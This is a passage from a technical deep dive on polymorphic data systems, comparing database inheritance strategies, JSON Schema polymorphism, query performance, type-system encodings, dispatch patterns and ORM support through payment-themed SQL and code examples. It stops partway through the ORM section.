# Polymorphic Data Systems: Technical Deep Dive

**Implementation Approaches, Storage Strategies, Query Patterns, Schema Representations**

---

## Executive Summary

Polymorphic data systems model entities that share a common base type but diverge
into specialized forms. A payment can be a credit card charge, a bank transfer,
or a crypto transaction. A notification can be an email, a push alert, or an SMS.
The core engineering challenge: how do you store, query, validate, and evolve
data when a single concept has multiple shapes?

This document dissects the problem across six dimensions: storage layout, schema
representation, query performance, type system encoding, runtime dispatch, and
migration strategy. Each section opens with the business-level insight, then
goes deep into implementation trade-offs with code, diagrams, and data.

**The bottom line for leadership:** Polymorphic design is not optional in any
non-trivial system. The choice of strategy directly impacts query latency,
storage cost, developer velocity, and security posture. Getting it wrong early
is expensive to fix later -- but the right choice depends entirely on your
read/write ratio, type count, and evolution frequency.

---

## Table of Contents

1. [Storage Strategies Compared](#1-storage-strategies-compared)
2. [JSON Schema Polymorphism](#2-json-schema-polymorphism)
3. [Query Patterns and Performance](#3-query-patterns-and-performance)
4. [Type System Representations](#4-type-system-representations)
5. [Runtime Dispatch Patterns](#5-runtime-dispatch-patterns)
6. [Migration and Evolution](#6-migration-and-evolution)
7. [ORM Implementations](#7-orm-implementations)
8. [Security Considerations](#8-security-considerations)
9. [Decision Framework](#9-decision-framework)
10. [Sources](#10-sources)

---

## 1. Storage Strategies Compared

**Plain-English Summary:** When different kinds of things share a common identity
(all are "payments," all are "content blocks"), you must decide how to lay them
out in your database. Each strategy trades off between query speed, storage
efficiency, schema flexibility, and data integrity. There is no universally
correct answer -- the right choice depends on your workload profile.

### 1.1 Single Table Inheritance (STI)

One table holds all types. A discriminator column (typically `type`) identifies
which subtype each row represents. Type-specific columns are nullable.

```
+------------------------------------------------------------------+
|                         payments                                  |
+------+------+--------+----------+-----------+----------+---------+
|  id  | type | amount | card_num | bank_acct | crypto   | routing |
+------+------+--------+----------+-----------+----------+---------+
|  1   | card |  99.00 | 4111***  |   NULL    |  NULL    |  NULL   |
|  2   | bank |  50.00 |   NULL   | 12345678  |  NULL    | 021000  |
|  3   | cryp | 200.00 |   NULL   |   NULL    | 0xABC... |  NULL   |
+------+------+--------+----------+-----------+----------+---------+
         ^--- discriminator column
```

**Pros:**
- Single query to read any type -- no JOINs
- Simple cross-type queries (`SELECT * FROM payments WHERE amount > 100`)
- Easy to add new types (just add columns, insert with new discriminator)
- Best read performance for mixed-type queries

**Cons:**
- Column bloat: N types with M unique columns each = up to N*M nullable columns
- No database-level NOT NULL constraints on type-specific fields
- Wasted storage from NULL-heavy rows (though modern DBs handle this well)
- Table scans grow slower as total row count increases across all types

**When to use:** Few subtypes (under 5-8), subtypes share most fields, read-heavy
workload, frequent cross-type queries.

---

### 1.2 Class Table Inheritance (CTI) / Joined Table / Table-per-Type

A shared base table holds common fields. Each subtype gets its own table with a
foreign key back to the base.

```
+--------------------+     +---------------------+     +---------------------+
|    payments        |     |   card_payments     |     |   bank_payments     |
+---------+----------+     +---------+-----------+     +---------+-----------+
|   id    |  amount  |     | pay_id  | card_num  |     | pay_id  | bank_acct |
+---------+----------+     +---------+-----------+     +---------+-----------+
|    1    |   99.00  |<----|    1    | 4111***   |     |    2    | 12345678  |
|    2    |   50.00  |<----+---------|-----------|---->|---------|-----------|
|    3    |  200.00  |     +---------------------+     +---------+-----------+
+---------+----------+
     ^                     +---------------------+
     |                     |  crypto_payments    |
     |                     +---------+-----------+
     |                     | pay_id  | wallet    |
     |                     +---------+-----------+
     +---------------------|    3    | 0xABC...  |
                           +---------+-----------+
```

**Pros:**
- Fully normalized -- no nullable type-specific columns
- Database-level constraints (NOT NULL, CHECK) on each subtype table
- Storage-efficient: no wasted space
- Clean separation of concerns per type

**Cons:**
- Every read requires a JOIN (base + subtype table)
- Polymorphic queries (all payments) need LEFT OUTER JOIN across ALL subtype tables
- Write path: INSERT into two tables (base + subtype) in a transaction
- Query complexity grows linearly with number of subtypes

**When to use:** Subtypes have significantly different fields, strong data integrity
requirements, write-heavy workload where normalization pays off, regulatory
environments requiring strict schema constraints.

---

### 1.3 Concrete Table Inheritance (Table-per-Concrete-Type)

Each subtype gets its own fully independent table. No shared base table exists.

```
+------------------------+    +------------------------+    +------------------------+
|    card_payments       |    |    bank_payments       |    |   crypto_payments      |
+----+--------+----------+    +----+--------+----------+    +----+--------+----------+
| id | amount | card_num |    | id | amount | bank_acct|    | id | amount | wallet   |
+----+--------+----------+    +----+--------+----------+    +----+--------+----------+
|  1 |  99.00 | 4111***  |    |  1 |  50.00 | 12345678 |    |  1 | 200.00 | 0xABC.. |
+----+--------+----------+    +----+--------+----------+    +----+--------+----------+
```

**Pros:**
- Fastest per-type queries (no JOINs, no discriminator filtering)
- Full constraint enforcement per table
- Independent indexing per type
- Clean schema -- each table is self-contained

**Cons:**
- Cross-type queries require UNION ALL across all tables
- No single foreign key target for "any payment"
- Shared fields (amount, created_at) are duplicated in every table definition
- Adding a common field means ALTER TABLE on every subtype table

**When to use:** Types are queried independently, cross-type queries are rare,
each type has radically different fields, high-throughput per-type workloads.

---

### 1.4 JSON/JSONB Columns for Type-Specific Data

Common fields in regular columns. Type-specific data in a JSON/JSONB column.

```sql
CREATE TABLE payments (
    id       INTEGER PRIMARY KEY,
    type     TEXT NOT NULL,
    amount   DECIMAL NOT NULL,
    details  JSONB NOT NULL    -- type-specific fields live here
);

-- Card payment:
INSERT INTO payments VALUES (1, 'card', 99.00,
    '{"card_num": "4111***", "exp": "12/27", "cvv_hash": "..."}');

-- Bank payment:
INSERT INTO payments VALUES (2, 'bank', 50.00,
    '{"account": "12345678", "routing": "021000021"}');
```

**Pros:**
- Single table, no JOINs, no nullable columns
- Infinite type-specific flexibility without schema changes
- PostgreSQL JSONB supports GIN indexes for efficient querying
- Natural fit for semi-structured or rapidly evolving type-specific data

**Cons:**
- No database-level type constraint on JSON structure
- JSON path queries slower than native column queries (2-10x for large values)
- PostgreSQL TOAST overhead: values > 2 KiB see substantial performance cliffs
- ORMs may not map JSON substructure to typed objects automatically

> **KEY INSIGHT:** The hybrid approach -- structured columns for shared/indexed
> fields plus JSONB for type-specific overflow -- is increasingly the dominant
> pattern in production systems. PostgreSQL 18 (September 2025) introduced
> asynchronous I/O and faster JSON operators, further improving this pattern's
> viability.

**When to use:** Rapidly evolving schemas, many subtypes, type-specific fields
are rarely queried directly, or queried only with simple equality checks.

---

### 1.5 Entity-Attribute-Value (EAV)

The "anti-pattern" that refuses to die. Every attribute is a row.

```
+--------------------+    +---------------------------------------------+
|     entities       |    |              attributes                     |
+------+------+------+    +------+-----------+----------------+---------+
|  id  | type | name |    |  id  | entity_id |  attr_name     | value   |
+------+------+------+    +------+-----------+----------------+---------+
|  1   | card | Visa |    |  1   |     1     |  card_num      | 4111*** |
|  2   | bank | ACH  |    |  2   |     1     |  exp_date      | 12/27   |
+------+------+------+    |  3   |     2     |  bank_acct     | 1234567 |
                          |  4   |     2     |  routing       | 021000  |
                          +------+-----------+----------------+---------+
```

**Pros:**
- Infinitely flexible: any entity can have any attribute
- No schema changes to add new fields or types
- Used successfully in healthcare (HL7/FHIR), e-commerce (Magento), and CMS

**Cons:**
- Queries are painful: reconstructing an entity requires N self-joins or pivots
- All values stored as strings -- type safety is application-level only
- Indexing is difficult (index on value column is essentially useless)
- 1000x slower than native columns for analytical queries per PostgreSQL benchmarks

**When it is actually appropriate:**
- User-defined attributes at runtime (custom fields in a SaaS product)
- Medical/clinical data with thousands of possible observations per patient
- Configuration systems where the attribute set is genuinely unbounded
- When JSONB is not available (legacy MySQL < 5.7, older SQLite)

---

### 1.6 Hybrid Approaches

The most effective production pattern combines strategies.

```
+------------------------------------------------------------------+
|                         payments                                  |
+------+------+--------+----------+--------------------------------+
|  id  | type | amount | status   |          details (JSONB)       |
+------+------+--------+----------+--------------------------------+
|  1   | card |  99.00 | complete | {"card_num":"4111","exp":"12/27"} |
|  2   | bank |  50.00 | pending  | {"acct":"12345","routing":"021"} |
|  3   | cryp | 200.00 | complete | {"wallet":"0xABC","chain":"eth"} |
+------+------+--------+----------+--------------------------------+
       ^--- indexed       ^--- indexed    ^--- GIN-indexed JSONB
```

Indexed structured columns for fields used in WHERE, ORDER BY, GROUP BY.
JSONB for everything type-specific that is displayed but rarely filtered.

---

### Strategy Comparison Matrix

| Criterion               | STI          | CTI (Joined) | Concrete     | JSONB Hybrid | EAV          |
|--------------------------|-------------|-------------|-------------|-------------|-------------|
| Read (single type)       | Fast        | Medium      | Fastest     | Fast        | Slow        |
| Read (cross-type)        | Fastest     | Slow        | Very Slow   | Fast        | Very Slow   |
| Write                    | Fast        | Medium      | Fast        | Fast        | Medium      |
| Storage efficiency       | Low-Medium  | High        | Medium      | High        | Low         |
| Schema constraints       | Weak        | Strong      | Strong      | Weak (JSON) | None        |
| Add new type             | ALTER TABLE | CREATE TABLE| CREATE TABLE| No DDL      | No DDL      |
| Add shared field         | ALTER TABLE | ALTER 1 tbl | ALTER N tbls| ALTER 1 tbl | No DDL      |
| Max practical subtypes   | 5-8         | 10-20       | Unlimited   | Unlimited   | Unlimited   |
| Cross-type FK target     | Yes         | Yes         | No          | Yes         | Yes         |
| ORM support              | Excellent   | Good        | Limited     | Growing     | Manual      |

---

## 2. JSON Schema Polymorphism

**Plain-English Summary:** JSON Schema is the contract between your API and its
consumers. When an endpoint can return different shapes of data, the schema must
express "this field could be one of these types." JSON Schema provides several
composition keywords for this -- but they differ in validation semantics, tooling
support, and developer ergonomics.

### 2.1 Composition Keywords

**`oneOf`** -- Exactly one subschema must match. Strict mutual exclusivity.

```json
{
  "oneOf": [
    { "$ref": "#/$defs/CardPayment" },
    { "$ref": "#/$defs/BankPayment" },
    { "$ref": "#/$defs/CryptoPayment" }
  ]
}
```

Validators check ALL subschemas and fail if zero or more than one matches. This
is the most common choice for discriminated polymorphism.

**`anyOf`** -- At least one subschema must match. Allows overlap.

```json
{
  "anyOf": [
    { "$ref": "#/$defs/Timestamped" },
    { "$ref": "#/$defs/Versioned" }
  ]
}
```

Use for mixin-style composition where multiple schemas can apply simultaneously.

**`allOf`** -- All subschemas must match. Intersection/extension semantics.

```json
{
  "allOf": [
    { "$ref": "#/$defs/BasePayment" },
    {
      "if": { "properties": { "type": { "const": "card" } } },
      "then": { "$ref": "#/$defs/CardFields" }
    }
  ]
}
```

Use for inheritance: "this object is a BasePayment AND has these extra fields."

### 2.2 OpenAPI 3.1 Discriminator

OpenAPI 3.1 (aligned with JSON Schema 2020-12) supports an explicit
`discriminator` object that tells code generators which field to inspect.

```yaml
PaymentRequest:
  oneOf:
    - $ref: '#/components/schemas/CardPayment'
    - $ref: '#/components/schemas/BankPayment'
    - $ref: '#/components/schemas/CryptoPayment'
  discriminator:
    propertyName: payment_type
    mapping:
      card: '#/components/schemas/CardPayment'
      bank: '#/components/schemas/BankPayment'
      crypto: '#/components/schemas/CryptoPayment'
```

> **KEY INSIGHT:** The discriminator is a performance optimization hint for
> tooling, NOT a validation constraint. It tells code generators "look at
> `payment_type` first to pick the right schema" rather than trying all
> three. A payload is still valid/invalid based on `oneOf` rules alone.
> Many teams misunderstand this and rely on discriminator for validation --
> it does not enforce anything.

### 2.3 Conditional Schemas with `if`/`then`/`else`

JSON Schema 2020-12 supports conditional composition without `oneOf`:

```json
{
  "type": "object",
  "properties": {
    "type": { "enum": ["card", "bank", "crypto"] },
    "amount": { "type": "number" }
  },
  "allOf": [
    {
      "if": {
        "properties": { "type": { "const": "card" } },
        "required": ["type"]
      },
      "then": {
        "properties": {
          "card_number": { "type": "string", "pattern": "^[0-9]{13,19}$" }
        },
        "required": ["card_number"]
      }
    },
    {
      "if": {
        "properties": { "type": { "const": "bank" } },
        "required": ["type"]
      },
      "then": {
        "properties": {
          "routing_number": { "type": "string" },
          "account_number": { "type": "string" }
        },
        "required": ["routing_number", "account_number"]
      }
    }
  ]
}
```

**Advantages over `oneOf`:** Better error messages (validator knows exactly
which branch failed and why). No ambiguity when schemas partially overlap.

**Disadvantages:** More verbose. Fewer tools understand `if`/`then`/`else`
compared to `oneOf`. Not supported in OpenAPI 3.0 (only 3.1+).

### 2.4 Validator Behavior Comparison

| Keyword    | Matching Rule         | Error Quality | Code-Gen Support | OpenAPI 3.0 | OpenAPI 3.1 |
|------------|----------------------|---------------|-----------------|-------------|-------------|
| `oneOf`    | Exactly 1 matches    | Poor (shows all failures) | Excellent | Yes | Yes |
| `anyOf`    | At least 1 matches   | Poor          | Good            | Yes         | Yes         |
| `allOf`    | All must match       | Good          | Excellent       | Yes         | Yes         |
| `if/then`  | Conditional          | Excellent     | Limited         | No          | Yes         |
| discriminator | Hint for tooling  | N/A           | Excellent       | Yes         | Yes         |

---

## 3. Query Patterns and Performance

**Plain-English Summary:** The storage strategy you pick determines how fast
your reads and writes are. STI wins on reads but wastes space. CTI is clean
but pays a JOIN tax. Concrete tables are fastest per-type but cannot query
across types. Real-world numbers help frame the decision.

### 3.1 STI Query Patterns

```sql
-- Fetch all card payments (fast -- single table scan with index)
SELECT * FROM payments WHERE type = 'card' AND amount > 100;

-- Cross-type aggregation (fast -- no joins needed)
SELECT type, SUM(amount) FROM payments GROUP BY type;

-- Recommended indexes:
CREATE INDEX idx_payments_type ON payments(type);
CREATE INDEX idx_payments_type_amount ON payments(type, amount);
```

**Performance profile:**
- Single-type read: O(log N) with B-tree index on discriminator
- Cross-type read: O(N) table scan (or index scan if filtered)
- Write: single INSERT, O(log N)
- Space: ~30-60% overhead from NULL columns (varies by type divergence)

### 3.2 CTI Query Patterns

```sql
-- Fetch a card payment (requires JOIN)
SELECT p.*, cp.card_num, cp.exp_date
FROM payments p
JOIN card_payments cp ON cp.payment_id = p.id
WHERE p.id = 42;

-- Cross-type query (LEFT OUTER JOIN to all subtypes -- expensive)
SELECT p.*,
       cp.card_num,
       bp.bank_acct,
       cr.wallet
FROM payments p
LEFT JOIN card_payments cp ON cp.payment_id = p.id
LEFT JOIN bank_payments bp ON bp.payment_id = p.id
LEFT JOIN crypto_payments cr ON cr.payment_id = p.id
WHERE p.amount > 100;
```

**Performance profile:**
- Single-type read: O(log N) + JOIN cost (~1.5-3x STI per query)
- Cross-type read: O(N) with K LEFT OUTER JOINs (K = number of subtypes)
- Write: 2 INSERTs in a transaction
- Space: minimal overhead, fully normalized

> **KEY INSIGHT:** SQLAlchemy documentation explicitly warns that joined table
> inheritance with polymorphic loading "implies that the mapping will always
> emit a (often large) series of LEFT OUTER JOIN to many tables, which is
> not efficient from a SQL perspective." For read-heavy polymorphic queries,
> this cost compounds quickly.

### 3.3 Concrete Table Query Patterns

```sql
-- Per-type query (fastest possible -- dedicated table)
SELECT * FROM card_payments WHERE amount > 100;

-- Cross-type query (requires UNION ALL -- no single index)
SELECT id, 'card' as type, amount FROM card_payments WHERE amount > 100
UNION ALL
SELECT id, 'bank' as type, amount FROM bank_payments WHERE amount > 100
UNION ALL
SELECT id, 'crypto' as type, amount FROM crypto_payments WHERE amount > 100
ORDER BY amount DESC;
```

**Performance profile:**
- Single-type read: O(log N_type) -- fastest of all strategies
- Cross-type read: K separate index scans + merge (cannot use single index)
- Write: single INSERT, O(log N_type)
- Space: duplication of shared column definitions (not data)

### 3.4 JSONB Query Patterns

```sql
-- Type-specific field query with GIN index
CREATE INDEX idx_payments_details ON payments USING GIN (details);

SELECT * FROM payments
WHERE type = 'card'
  AND details->>'card_num' LIKE '4111%';

-- Cross-type with native column filter + JSON extraction
SELECT type, amount, details->>'status' as provider_status
FROM payments
WHERE amount > 100;

-- JSON Path query (PostgreSQL 12+, enhanced in 16+)
SELECT * FROM payments
WHERE details @? '$.wallet ? (@ starts with "0x")';
```

**Performance profile:**
- Structured column queries: equivalent to STI
- JSONB field queries with GIN: ~2-5x slower than native B-tree
- JSONB values > 2 KiB: 2-10x degradation due to TOAST decompression
- JSON Path queries: 15-25% faster than chained arrow operators for deep nesting

### 3.5 Indicative Performance Comparison

Based on published benchmarks and documented behavior from PostgreSQL, SQLAlchemy,
and Rails community testing (note: exact numbers vary by hardware, dataset size,
and query complexity):

| Operation                  | STI      | CTI        | Concrete  | JSONB Hybrid |
|----------------------------|----------|------------|-----------|-------------|
| Single row by ID           | ~0.1 ms  | ~0.2-0.3 ms| ~0.1 ms  | ~0.1 ms     |
| 1000 rows, single type     | ~2 ms    | ~4-6 ms    | ~1.5 ms  | ~2 ms       |
| 1000 rows, all types       | ~2 ms    | ~8-15 ms   | ~5-8 ms  | ~2 ms       |
| Aggregate across types     | ~3 ms    | ~10-20 ms  | ~8-12 ms | ~3 ms       |
| INSERT single row          | ~0.2 ms  | ~0.4 ms    | ~0.2 ms  | ~0.2 ms     |
| Filter on type-specific col| ~1 ms    | ~2-3 ms    | ~0.8 ms  | ~3-8 ms*    |

*JSONB field query without expression index; with expression index approaches native column speed.

These are rough order-of-magnitude estimates for a warmed PostgreSQL instance with
~100K rows. The key takeaway: CTI pays 2-5x on reads for normalization benefits;
JSONB pays a premium on type-specific field filtering but matches STI for
structured column operations.

---

## 4. Type System Representations

**Plain-English Summary:** Every language has its own way of expressing "this
value could be one of several types." The representation you choose in your
application layer determines how safe, ergonomic, and performant your
polymorphic code will be.

### 4.1 Python

**Union Types (Python 3.10+):**

```python
from typing import Union, Literal
from pydantic import BaseModel, Field

class CardPayment(BaseModel):
    type: Literal["card"] = "card"
    card_number: str
    amount: float

class BankPayment(BaseModel):
    type: Literal["bank"] = "bank"
    account_number: str
    routing_number: str
    amount: float

# Discriminated union -- Pydantic V2 validates efficiently using 'type' field
Payment = Annotated[
    Union[CardPayment, BankPayment],
    Field(discriminator="type")
]
```

Pydantic V2 implements discriminated union logic in Rust, making validation
extremely fast -- it reads the discriminator field first and dispatches to the
correct model without trying all alternatives.

**Abstract Base Classes:**

```python
from abc import ABC, abstractmethod

class Payment(ABC):
    @abstractmethod
    def process(self) -> str: ...

class CardPayment(Payment):
    def process(self) -> str:
        return "charging card"
```

**`__init_subclass__` Registry:**

```python
class Payment:
    _registry: dict[str, type] = {}

    def __init_subclass__(cls, type_key: str = None, **kwargs):
        super().__init_subclass__(**kwargs)
        if type_key:
            Payment._registry[type_key] = cls

    @classmethod
    def from_dict(cls, data: dict) -> "Payment":
        subclass = cls._registry[data["type"]]
        return subclass(**data)

class CardPayment(Payment, type_key="card"):
    ...
```

**Protocol (Structural Typing):**

```python
from typing import Protocol, runtime_checkable

@runtime_checkable
class Processable(Protocol):
    def process(self) -> str: ...
    amount: float

# Any class with process() and amount satisfies this -- no inheritance needed
```

### 4.2 TypeScript

**Discriminated Unions (Tagged Unions):**

```typescript
interface CardPayment {
    type: "card";
    cardNumber: string;
    amount: number;
}

interface BankPayment {
    type: "bank";
    accountNumber: string;
    routingNumber: string;
    amount: number;
}

type Payment = CardPayment | BankPayment;

function processPayment(p: Payment): string {
    switch (p.type) {
        case "card":
            return `Charging card ${p.cardNumber}`;  // TypeScript narrows type
        case "bank":
            return `ACH to ${p.accountNumber}`;
        default:
            const _exhaustive: never = p;  // Compile error if new type added
            return _exhaustive;
    }
}
```

TypeScript's narrowing via discriminated unions is the gold standard for
type-safe polymorphic dispatch in frontend code. The `never` exhaustiveness
check catches missing cases at compile time.

### 4.3 GraphQL

**Interfaces (shared fields + type-specific fields):**

```graphql
interface Payment {
    id: ID!
    amount: Float!
    createdAt: DateTime!
}

type CardPayment implements Payment {
    id: ID!
    amount: Float!
    createdAt: DateTime!
    cardNumber: String!
    expiryDate: String!
}

type BankPayment implements Payment {
    id: ID!
    amount: Float!
    createdAt: DateTime!
    accountNumber: String!
    routingNumber: String!
}
```

**Union Types (no shared fields required):**

```graphql
union SearchResult = Product | User | Order

type Query {
    search(term: String!): [SearchResult!]!
}
```

**Inline Fragments (client-side type dispatch):**

```graphql
query {
    payments {
        __typename
        ... on CardPayment { cardNumber expiryDate }
        ... on BankPayment { accountNumber routingNumber }
    }
}
```

> **KEY INSIGHT:** GraphQL interfaces require all implementing types to
> redeclare shared fields. Union types have no shared fields at all. Neither
> maps directly to class inheritance -- they are closer to Go-style interfaces
> (structural, not nominal). The `__typename` field is the discriminator,
> automatically injected by GraphQL runtimes.

### 4.4 Rust

Rust offers three polymorphism strategies with distinct performance profiles:

**Enums with Data (Closed Polymorphism):**

```rust
enum Payment {
    Card { card_number: String, amount: f64 },
    Bank { account: String, routing: String, amount: f64 },
    Crypto { wallet: String, chain: String, amount: f64 },
}

fn process(p: &Payment) -> String {
    match p {
        Payment::Card { card_number, amount } =>
            format!("Charging {} to card {}", amount, card_number),
        Payment::Bank { account, .. } =>
            format!("ACH to {}", account),
        Payment::Crypto { wallet, chain, .. } =>
            format!("Sending to {} on {}", wallet, chain),
    }
}
```

Static dispatch, zero runtime overhead, exhaustive pattern matching. Adding a
new variant forces updating every `match` -- the compiler is your safety net.

**Trait Objects (Open Polymorphism):**

```rust
trait Processable {
    fn process(&self) -> String;
    fn amount(&self) -> f64;
}

fn total(payments: &[Box<dyn Processable>]) -> f64 {
    payments.iter().map(|p| p.amount()).sum()
}
```

Dynamic dispatch via vtable (one pointer indirection per call). Open-ended --
new types can implement the trait without modifying existing code.

**Generics (Monomorphized/Static Dispatch):**

```rust
fn process_all<P: Processable>(payments: &[P]) -> Vec<String> {
    payments.iter().map(|p| p.process()).collect()
}
```

Zero-cost abstraction: the compiler generates specialized code for each concrete
type. Fastest possible, but all items in a collection must be the same type.

### Type System Comparison

| Language   | Mechanism              | Open/Closed | Dispatch   | Exhaustiveness | Zero-Cost |
|-----------|------------------------|-------------|-----------|----------------|-----------|
| Python    | Union + discriminator  | Closed      | Runtime   | No (manual)    | No        |
| Python    | ABC / Protocol         | Open        | Runtime   | No             | No        |
| TypeScript| Discriminated union    | Closed      | Compile   | Yes (`never`)  | N/A (JS)  |
| GraphQL   | Interface              | Open        | Runtime   | No             | N/A       |
| GraphQL   | Union                  | Closed      | Runtime   | No             | N/A       |
| Rust      | Enum                   | Closed      | Static    | Yes (match)    | Yes       |
| Rust      | Trait object (dyn)     | Open        | Dynamic   | No             | No        |
| Rust      | Generics               | Open        | Static    | Yes            | Yes       |

---

## 5. Runtime Dispatch Patterns

**Plain-English Summary:** Once data arrives in your application, you need to
route it to the correct handler based on its type. This section covers the
classical patterns for doing so, from the Gang of Four visitor to modern
pattern matching.

### 5.1 Visitor Pattern (Double Dispatch)

The visitor externalizes operations over a type hierarchy without modifying the
types themselves.

```python
class PaymentVisitor:
    def visit_card(self, payment: CardPayment) -> str: ...
    def visit_bank(self, payment: BankPayment) -> str: ...

class CardPayment:
    def accept(self, visitor: PaymentVisitor) -> str:
        return visitor.visit_card(self)

class BankPayment:
    def accept(self, visitor: PaymentVisitor) -> str:
        return visitor.visit_bank(self)

# New operation = new visitor class, no changes to payment classes
class RefundVisitor(PaymentVisitor):
    def visit_card(self, p): return f"Refunding card {p.card_number}"
    def visit_bank(self, p): return f"Reversing ACH to {p.account}"
```

**Trade-off:** Adding a new operation is easy (new visitor). Adding a new type
is hard (must update every visitor). This is the exact inverse of inheritance-
based polymorphism, where adding types is easy but adding operations is hard.
This duality is known as the "Expression Problem."

### 5.2 Registry / Factory Pattern

A central registry maps discriminator values to handler classes or functions.

```python
# Decorator-based registry
_handlers: dict[str, Callable] = {}

def handles(type_key: str):
    def decorator(fn):
        _handlers[type_key] = fn
        return fn
    return decorator

@handles("card")
def process_card(data: dict) -> str:
    return f"Charging card {data['card_number']}"

@handles("bank")
def process_bank(data: dict) -> str:
    return f"ACH to {data['account']}"

def dispatch(data: dict) -> str:
    handler = _handlers.get(data["type"])
    if not handler:
        raise ValueError(f"Unknown payment type: {data['type']}")
    return handler(data)
```

This is the most common pattern in Python web frameworks. FastAPI, Flask, and
Django all use variations of registry-based dispatch internally.

### 5.3 Pattern Matching (Python 3.10+)

```python
def process_payment(payment: dict) -> str:
    match payment:
        case {"type": "card", "card_number": num, "amount": amt}:
            return f"Charging {amt} to card {num}"
        case {"type": "bank", "account": acct}:
            return f"ACH transfer to {acct}"
        case {"type": "crypto", "wallet": w, "chain": c}:
            return f"Sending to {w} on {c}"
        case _:
            raise ValueError(f"Unknown payment type")
```

Python 3.14 introduced `__match__`, allowing classes to customize their pattern
matching behavior -- useful for polymorphic models that need to match on
computed or derived attributes rather than just raw data.

### 5.4 Dispatch Pattern Comparison

| Pattern          | Add New Type | Add New Operation | Type Safety | Runtime Cost |
|------------------|-------------|-------------------|-------------|-------------|
| Visitor          | Hard        | Easy              | Strong      | 2 virtual calls |
| Registry/Factory | Easy        | Medium            | Weak        | Dict lookup |
| Pattern Match    | Medium      | Medium            | Medium      | Sequential check |
| Inheritance      | Easy        | Hard              | Strong      | 1 virtual call |
| `__init_subclass__`| Automatic | Medium            | Strong      | Dict lookup |

---

## 6. Migration and Evolution

**Plain-English Summary:** The initial polymorphic strategy is rarely the final
one. Systems evolve. You will need to add new types, restructure hierarchies,
or change storage strategies entirely. Planning for this from the start saves
months of migration pain later.

### 6.1 Adding a New Type

**STI:** Lowest friction. Add nullable columns for type-specific fields if needed,
start inserting rows with the new discriminator value. Existing queries continue
to work (they either filter by type or handle the new type in application code).

```sql
-- Add crypto payment support to existing STI table
ALTER TABLE payments ADD COLUMN wallet TEXT;
ALTER TABLE payments ADD COLUMN chain TEXT;
-- No data migration needed; old rows have NULL for new columns
```

**CTI:** Create a new subtype table. Base table unchanged. Existing JOINs
unaffected (they LEFT JOIN, so new table is simply not matched for old types).

```sql
CREATE TABLE crypto_payments (
    payment_id INTEGER REFERENCES payments(id),
    wallet TEXT NOT NULL,
    chain TEXT NOT NULL
);
```

**Concrete:** Create a new independent table. Update any UNION ALL queries
to include it. This is the most disruptive for cross-type consumers.

**JSONB Hybrid:** Zero DDL changes. New type just uses new keys in the JSON column.
Application code must know about the new structure.

### 6.2 Changing Discrimination Strategy

Migrating from STI to CTI (the most common evolution path when type count grows):

```
Step 1: Create new subtype tables
Step 2: Backfill from STI table: INSERT INTO card_payments SELECT ... WHERE type='card'
Step 3: Run dual-write: application writes to both STI and CTI tables
Step 4: Switch reads to CTI tables
Step 5: Drop type-specific columns from STI table (now the base table)
Step 6: Remove dual-write; STI table becomes base-only
```

> **KEY INSIGHT:** This migration is a form of the "Strangler Fig" pattern --
> you build the new structure alongside the old one, gradually shift traffic,
> then remove the old. Never do a big-bang cutover for polymorphic migrations;
> the surface area for data corruption is too large.

### 6.3 Migrating from Non-Polymorphic to Polymorphic

When separate, unrelated tables need to be unified under a common type:

```
Before:                          After (CTI):
                                 +------------------+
+----------------+               |    content       |
| blog_posts     |  ──────>      | id | type | ... |
+----------------+               +------------------+
                                      |    |
+----------------+               +----+    +----+
| news_articles  |  ──────>      | blog_   | news_    |
+----------------+               | posts   | articles |
                                 +---------+----------+

Migration steps:
1. Create base `content` table with shared columns
2. Add FK column to existing tables pointing to content.id
3. Backfill: INSERT INTO content for each existing row
4. Update existing tables to reference content.id
5. Update application code to use polymorphic queries
6. Optionally: move shared columns out of child tables
```

---

## 7. ORM Implementations

**Plain-English Summary:** Every major ORM has an opinion on polymorphism.
Understanding what your ORM supports (and what it does not) determines whether
you work with the framework or fight against it.

### 7.1 SQLAlchemy (Python)

SQLAlchemy supports all three inheritance strategies with explicit configuration:

**Single Table Inheritance:**

```python
from sqlalchemy import Column, Integer, String, Float
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

class Payment(Base):
    __tablename__ = "payments"
    id = Column(Integer, primary_key=True)
    type = Column(String(50), nullable=False)
    amount = Column(Float, nullable=False)

    __mapper_args__ = {
        "polymorphic_on": type,        # discriminator column
        "polymorphic_identity": "payment",
    }

class CardPayment(Payment):
    card_number = Column(String(19))
    __mapper_args__ = {"polymorphic_identity": "card"}

class BankPayment(Payment):
    account_number = Column(String(20))
    routing_number = Column(String(9))
    __mapper_args__ = {"polymorphic_identity": "bank"}
```

**Joined Table Inheritance:**

```python
class Payment(Base):
    __tablename__ = "payments"
    id = Column(Integer, primary_key=True)
    type = Column(String(50))
    amount = Column(Float)
    __mapper_args__ = {
        "polymorphic_on": type,
        "polymorphic_identity": "payment",
    }

class CardPayment(Payment):
    __tablename__ = "card_payments"
    id = Column(Integer, ForeignKey("payments.id"), primary_key=True)
    card_number = Column(String(19), nullable=False)
    __mapper_args__ = {"polymorphic_identity": "card"}
```

SQLAlchemy's `with_polymorphic()` controls eager/lazy loading of subtypes.
The `selectin_polymorphic()` loader (SQLAlchemy 2.0+) uses SELECT IN for
subtype loading, avoiding the LEFT OUTER JOIN explosion.

### 7.2 Django (Python)

Django provides four distinct polymorphism mechanisms:

**Abstract Base Classes** (no table for base):

```python
class Payment(models.Model):
    amount = models.DecimalField(max_digits=10, decimal_places=2)

    class Meta:
        abstract = True

class CardPayment(Payment):  # gets its own table with 'amount' column
    card_number = models.CharField(max_length=19)
```

**Multi-Table Inheritance** (CTI -- automatic one-to-one link):

```python
class Payment(models.Model):
    amount = models.DecimalField(max_digits=10, decimal_places=2)

class CardPayment(Payment):  # auto-created OneToOneField to Payment
    card_number = models.CharField(max_length=19)
```

Django automatically creates a `payment_ptr_id` foreign key. Querying
`Payment.objects.all()` returns base objects; accessing `.cardpayment`
triggers an additional query (N+1 risk).

**Proxy Models** (same table, different Python behavior):

```python
class Payment(models.Model):
    type = models.CharField(max_length=20)
    amount = models.DecimalField(max_digits=10, decimal_places=2)

class CardPayment(Payment):
    class Meta:
        proxy = True

    def process(self):
        return "charging card"
```

**ContentType Framework** (generic foreign keys):

```python
from django.contrib.contenttypes.fields import GenericForeignKey

class Comment(models.Model):
    content_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')
```

**django-polymorphic** (third-party, most popular):

Adds automatic downcasting to multi-table inheritance. `Payment.objects.all()`
